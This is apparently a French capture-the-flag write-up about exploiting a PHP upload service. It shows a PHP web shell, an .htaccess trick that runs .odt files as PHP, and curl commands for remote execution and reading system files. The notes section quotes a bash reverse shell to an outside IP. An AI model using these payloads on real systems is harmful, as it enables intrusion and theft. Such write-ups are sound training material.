# applicatif php port 80

c'est la partie juteuse du CTF, pas mal de truc à faire dans celui là et pas besoin d'outils de la mort : on peut tout faire à la main ou presque.

avec un navigateur, on s'aperçoit qu'il s'agit d'un service upload de fichier. ca sent la faille applicative.

http://51.68.36.97/

en faisant un f12 pour voir le source on remarque que le receiver du post est un fichier `php`.

envoi d'un fichier image random redirige vers http://51.68.36.97/uploads/

pas de robots.txt ni de sitemap.


## énumération de failles

```sh
nmap -Pn -p 80 -script vuln -oA vuln $RHOST
```

voir [rapport nmap](./vuln.nmap)

notable avec un exploit:

- CVE-2021-4479 : buffer overflow CVE-2021-4479 mais pas de RCE ?
- CVE-2014-4210 : pour du weblogic ? xss ?

avec metasploit

- mod_cgi shellshock ?
- mod_negociation ?
- mod_userdir pour énumération ?

## exploit applicatif via uploads

:bulb: injecter un script php ?

### poc

shell.php
```php
<?php system($_GET['cmd']); ?>
```

ERRREUR
> Sorry, there was an error uploading your file. Forbidden extensions are: php, php2, php3, php4, php5, php6, php7, phps, pht, phtm, phtml, pgif, shtml, phar, inc, hphp, ctp 

voir https://thibaud-robin.fr/articles/bypass-filter-upload/

en cv-rda.odt: upload success

```sh
curl http://51.68.36.97/uploads/cv-rda.odt?cmd=id
<?php system($_GET['cmd']); ?>
```

le fichier n'est pas interprété

-> pousser un fichier .htaccess associant le type php à l'extension de fichier `.odt`.

`.htaccess`
```
AddType application-x-httpd-php .odt
```

pousser via curl:

```sh
curl 'http://51.68.36.97/upload.php' --compressed -X POST -F fileToUpload=@.htaccess
```

### récupération du flag

https://www.urlencoder.org/ pour encoder nos commandes en paramètre GET.

on navigue dans l'arborescence, surtout en essayant de remonter cran par cran.
```sh
curl -v "http://$RHOST/uploads/cv-rda.odt?cmd=ls%20.."
```

et Jeannie Longo, on trouve un fichier flag.txt !
avec en bonus les sites des challenges 7 et 10 !

```sh
curl -v "http://$RHOST/uploads/cv-rda.odt?cmd=cat%20%20..%2F..%2Fflag.txt"
*   Trying 51.68.36.97:80...
* Connected to 51.68.36.97 (51.68.36.97) port 80
> GET /uploads/cv-rda.odt?cmd=cat%20%20..%2F..%2Fflag.txt HTTP/1.1
> Host: 51.68.36.97
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Wed, 12 Mar 2025 12:05:22 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 47
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 51.68.36.97 left intact
FLAG3{07993337ce7f0273a65ba0db8ee9b24623da7e1e}%  
```

My work is done here

## nettoyage

```sh
curl -v "http://$RHOST/uploads/cv-rda.odt?cmd=rm%20cv-rda.odt"
```

Il faudrait aussi supprimer le `.htaccess`.

## poursuite avec reconnaissance sur l'host

l'idée est maintenant de récupérer le plus d'informations sur le contenu de la machine avec le user qui nous permets d'exécuter du code.

Je commence par l'écriture d'un makefile pour industrialiser le bouzin. voir [Makefile](./Makefile).
Pas besoin d'ouvrir un reverse-shell et encore moins de metasploit : rien que du très basique.

Vous verrez que je download / tee systèmatiquement les sorties de mes commandes : l'idée est de ne pas avoir à rejouer la commande 2 jours plus tard pour retrouver un indice : on doit pouvoir faire l'analyse de ce que l'on scrape hors ligne et tranquillou sans avoir de connexion avec la victime.

### récupérer la conf apache2
```sh
make run CMD="cat /etc/apache2/apache2.conf" | tee -a etc-apache2.txt
```

en explorant l'arborescence on trouve la définition des autres sites, notamment le site du challenge 7.

```sh
make run CMD="cat /etc/apache2/sites-enabled/challenge7.conf"
```

### tentative brutale de trouver d'autres flags
```sh
make run CMD="find /var/www -name="*.txt" -exec grep FLAG {} +"

/var/www/flag.txt:FLAG3{07993337ce7f0273a65ba0db8ee9b24623da7e1e}
/var/www/challenge10/flag.txt:FLAG10{b2ece9353bac8fdda4fd579e19622607059cdec8}
/var/www/challenge7/compliance/flag.txt:FLAG8{99e9c842544a1aa4f6886c89a47f1b7d3e8feb51}
/var/www/challenge7/welcome.php:    <p>FLAG7{ca6f82334977c7ab3892c8d0e6e1ce821ba6398b}</p>
```

et ca dépile !

tant qu'à faire, parce que ca parait prometteur, on récupére de la conf apache
```sh
make run CMD="find /etc/apache2/ -name '*' -exec cat {} +" | tee etc-apache2.txt
```

voir [etc-apache2.txt](./etc-apache2.txt)

on voit que le site en 443 est down parce que mal configuré. a priori plus rien à gratter pour le port 443.

on y trouve aussi la liste des mod apache activés qui peuvent être vulnérable (spoiler je pense qu'il n'y en a pas).

### récupération des images analyses metadata

avec `exiv2` : aucune métadata dans les images de uploads

*note de moi-même plus tard :* je ne sais pas pourquoi j'ai pas pensé à la stégano en plus ... peut-être parce que c'est pas du hacking ? :D

voir [09-la_merde_a_fred](../09-la_merde_a_fred/) pour en savoir plus.

### récupération de la liste des process
```sh
make run CMD="ps aux" | tee -a all-processes.txt
```

voir [all-processes.txt](./all-processes.txt)

flag5 trouvé dans la liste des process !
`/usr/bin/bash -c echo "FLAG5{fce3563b5af5afe22f0a16a54f577a0178ee2822}" | nc -l -p 57123`

note de moi-même plus tard : on trouvera avec le reste de l'équipe que le flag est dans un fichier `/etc/`.

```sh
make run CMD="grep -r FLAG /etc"
/etc/systemd/system/ncflag.service:ExecStart=/usr/bin/bash -c 'echo "FLAG5{fce3563b5af5afe22f0a16a54f577a0178ee2822}" | nc -l -p 57123'
```

57123 est un port qui a échappé à mon scan en phase 01 :(

on devrait pouvoir y accéder aussi à travers un script qui lit la socket: voir [read_socket_challenge5.py](/read_socket_challenge5.py)
```sh
python3 read_socket_challenge5.py
```

mais pas de réponse ... parce que quelqu'un a déjà consommé la sortie du `cat` et que le script du service ne gère pas un restart automatique ?

### récupération des users / groups
```sh
make run CMD="cat /etc/passwd" | tee -a etc-passwd.txt
make run CMD="cat /etc/group" | tee -a etc-group.txt
```

voir [etc-passwd.txt](./etc-passwd.txt) et [etc-group.txt](./etc-group.txt).

- admin <-- on a déjà un password trouvé dans SAMBA ;) à tester
- nginx-user : gné ? depuis quand il faut un user avec un home pour nginx ??!

pas de droit sudo pour www-data

les tentatives de `su` admin depuis `www-data` dans [10-king_oh_the_hill](../10-king_of_the_hill/).

```sh
make run CMD="groups" | tee groups.txt
```

rien hormi `www-data`.

### récupération de la configuration nginx

```sh
make run CMD="cat /etc/nginx/nginx.conf" | tee nginx.conf
```

voir [nginx.conf](./nginx.conf)

modules enabled
```sh
50-mod-http-image-filter.conf
50-mod-http-xslt-filter.conf
50-mod-mail.conf
50-mod-stream.conf
```

default site
```sh
make run CMD="cat /etc/nginx/sites-enabled/default" | tee nginx-default-site.conf
```

voir [nginx-default-site](./nginx-default-site.conf)

c'est le site derrière le port 8080 ! et c'est pas un RP (voir les notes dans [06-nginx-8080](../06-nginx-8080/) dans lequel je me suis dit que la page était tellement dry que pitêtre c'était un RP :D)

### logs

pas de possibilité d'avoir à /var/log/apache2

### env

```
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:179626
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=a03ab9614aaa4589a41eb8d11b652102
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/challenge3/uploads
```

pas de secret chargé dans l'environnement du process

### pid

19515

listing de /proc/19515 nada

### autres scans

linpeas.sh ? voir [10-king_of_the_hill](../10-king_of_the_hill/)

find /etc -type f -readable

- /var/shm
- /usr/lib/apache2/
- /etc/mime.types
- KO /home/*/public_html

gros find depuis / pour trouver les fichiers en lecture et grep FLAG ? c'est moche.

## récupérer touts les fichiers de /var/www

`find /var/www -name "*" -exec grep ".*" {} +`

## list of readables files

```sh
make run CMD="find / type f -readable"
```

pouah, y'en a plein !


fichiers notables (mais pas de fichiers flag.txt):
```
/home/admin/.bashrc
/home/admin/.profile
/home/admin/.bash_logout
/home/nginx-user/.bashrc
/home/nginx-user/.profile
/home/nginx-user/.bash_logout
/home/ubuntu/.bashrc
/home/ubuntu/.sudo_as_admin_successful
/home/ubuntu/.profile
/home/ubuntu/.bash_logout
/var/www/html/index.nginx-debian.html
/var/www/html/index.html
/var/www/challenge3/uploads/.htaccess.txt
/etc/init.d/apache2
/etc/cron.daily/apache2
/etc/php/7.4/apache2/php.ini
/etc/php/7.4/cli/php.ini
/usr/lib/php/7.4/php.ini-production
/usr/lib/php/7.4/php.ini-production.cli
/var/www/html/index.nginx-debian.html
```

chercher tout les valeurs qui ressemblent à un flag dans les fichiers lisibles : ATTENTION les flags ne sont pas des guids !

40 xdigit

```sh
find / -type f -readable -exec grep -Ewo '.*\{[[:xdigit:]]{40}\}' {} + 2>&1
```

commandes utiles

```sh
grep "^/etc/[^/]*\$" readable-files.lst
```

## autre

en surveillant les tentatives des uns et des autres

```sh
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/XXX.XXX.XX.XX/8085 0>&1'");
?>
```

c'est une IP public Orange de Poitiers ! les coquins qui se sont monté un reverse shell !

## poursuite

Il y a bien des vulnérabilités, voir la section "énumération de failles" mais c'est soit du DoS (Deny of Service) soit des trucs obscures avec des mods pas activés dans l'instance à laquelle on fait face : pas envie de ruiner l'expérience des autres équipes dont on va pas tenter le DoS et toute facon on a un RCE bien fiable avec tout ce que l'on fait juste au dessu !

Par contre, ca titille de tenter l'escalade de privilège mais ce sera un autre chapitre en fin de write-up, voir [king_of_the_hill](./)

## réseaux

```sh
make run CMD="ip addr"
: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eno1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether a4:bf:01:2f:0c:14 brd ff:ff:ff:ff:ff:ff
    inet 51.68.36.97/24 metric 100 brd 51.68.36.255 scope global dynamic eno1
       valid_lft 45584sec preferred_lft 45584sec
    inet6 2001:41d0:203:3761::/56 scope global 
       valid_lft forever preferred_lft forever
    inet6 fe80::a6bf:1ff:fe2f:c14/64 scope link 
       valid_lft forever preferred_lft forever
3: eno2: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether a4:bf:01:2f:0c:15 brd ff:ff:ff:ff:ff:ff
```

on a une interface avec l'IP public, pas la peine de scanner le range car on va tomber sur des machines qui n'ont rien à voir et là on sera hors la loi si on commence à gratter.

`eno2` est down, pas de piste de ce côté là.

dans l'idéal on aurait trouvé un lan en 172.x, en 10.x ou en 192.168.x indiquant un réseau interne, cela aurait signifié qu'il pouvait y'avoir d'autres machines à "explorer" mais tel n'est pas le cas. (au passage, on sait qu'il y a un `netcat` sur la machine et on aurait pu scanner avec, pas avec la même précision que `nmap` mais ca fait une partie du taff).

je vous ai déjà dit que les organisateurs étaient pas fun ? :D

